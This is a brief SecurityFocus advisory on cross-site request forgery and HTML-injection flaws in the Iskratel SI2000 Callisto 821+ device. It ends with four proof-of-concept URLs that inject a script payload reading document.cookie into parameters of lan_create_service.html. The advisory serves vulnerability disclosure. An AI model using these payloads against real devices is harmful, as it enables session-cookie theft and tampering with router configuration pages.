source: https://www.securityfocus.com/bid/48711/info

The Iskratel SI2000 Callisto 821+ is prone to a cross-site request-forgery vulnerability and multiple HTML-injection vulnerabilities.

An attacker can exploit the cross-site request-forgery issue to perform unauthorized actions in the context of a user's session. This may aid in other attacks.

The attacker can exploit the HTML-injection issues to execute arbitrary script code in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered. Other attacks are also possible. 

http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:9=%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:10=%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:11=%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:15=%3Cscript%3Ealert(document.cookie)%3C/script%3E